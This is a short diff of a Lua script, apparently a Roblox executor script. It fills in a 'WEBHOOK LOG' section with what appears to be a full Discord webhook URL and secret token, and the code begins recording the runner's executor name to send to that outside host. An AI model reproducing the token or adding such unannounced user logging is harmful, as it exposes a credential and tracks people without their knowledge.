@@ -100,7 +100,7 @@ end)
 -- ── [D] WEBHOOK LOG ───────────────────────────────
 task.spawn(function()
     local fn = _req(); if not fn then return end
-    local _WH = "https://discord.com/api/webhooks/GÁN_WEBHOOK_CỦA_BẠN_VÀO_ĐÂY"
+    local _WH = "https://discord.com/api/webhooks/1497119037514059777/N9qhCw1IcpoD59tMexITxubZP-d7Mfc3ZTuFU0A-nxVwP77nHywK2fEg13hU9sODj44q"
 
     local execName = "Unknown"
     _pcall(function()
